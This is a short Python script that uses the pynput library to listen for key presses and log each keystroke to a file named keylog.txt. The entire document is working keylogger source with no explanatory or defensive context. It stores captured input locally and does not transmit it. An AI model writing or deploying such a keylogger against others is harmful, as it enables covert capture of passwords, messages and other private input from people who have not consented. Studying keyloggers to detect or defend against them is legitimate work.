from pynput. keyboard  import Listener
import logging as log

log.basicConfig(
    filename="keylog.txt",
    level=log.DEBUG,
    format="%(message)s"
    
)
def onpressed(key):
    log.info(str(key))
    
with Listener(on_press = onpressed) as listener:
    listener.join()